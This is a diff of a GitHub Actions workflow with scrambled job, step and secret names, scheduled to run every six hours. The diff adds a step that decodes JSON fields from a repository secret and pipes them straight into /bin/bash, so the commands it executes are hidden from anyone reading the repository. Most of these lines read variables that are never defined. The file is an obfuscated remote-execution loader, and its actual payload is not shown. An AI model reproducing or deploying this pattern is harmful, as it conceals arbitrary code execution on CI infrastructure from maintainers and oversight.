@@ -1,24 +1,29 @@
 name: yuanriyue3461
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 2/6 * * *'
-
-jobs:  # 16875
+    - cron: '16 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yuanriyue3461
         env:
-          e40: ${{ secrets.e40 }}
+          aj064: ${{ secrets.aj064 }}
         run: |
-          echo $e40 | jq -r .hyiiy1471 | /bin/bash
-          echo $kawv4 | jq -r .oh61007 | /bin/bash
-          echo $wdco65463 | jq -r .lril46046 | /bin/bash
-          echo $l7 | jq -r .ejezk95661 | /bin/bash
-          echo $tpipa4 | jq -r .inniv0 | /bin/bash
-          echo $krol22038 | jq -r .hsw1 | /bin/bash
-          echo $zj33 | jq -r .wggrj5 | /bin/bash
-          echo $iyfbr82 | jq -r .nwdl7993 | /bin/bash
+          echo $aj064 | jq -r .u3852 | /bin/bash
+          echo $svoxj30 | jq -r .b5 | /bin/bash
+          echo $q8368 | jq -r .d4 | /bin/bash
+          echo $yml9429 | jq -r .cne3 | /bin/bash
+          echo $p92 | jq -r .uxs1533 | /bin/bash
+          echo $voz90 | jq -r .ulbqi260 | /bin/bash
+          echo $u0 | jq -r .odde281 | /bin/bash
+          echo $sbw575 | jq -r .qpzrd81 | /bin/bash
+          echo $f1494 | jq -r .jdzqf16136 | /bin/bash
+          echo $e0151 | jq -r .kc74037 | /bin/bash
+          echo $j22 | jq -r .sax43007 | /bin/bash
+          echo $oml3308 | jq -r .bm2446 | /bin/bash
+          echo $jcv28918 | jq -r .tghq367 | /bin/bash
 
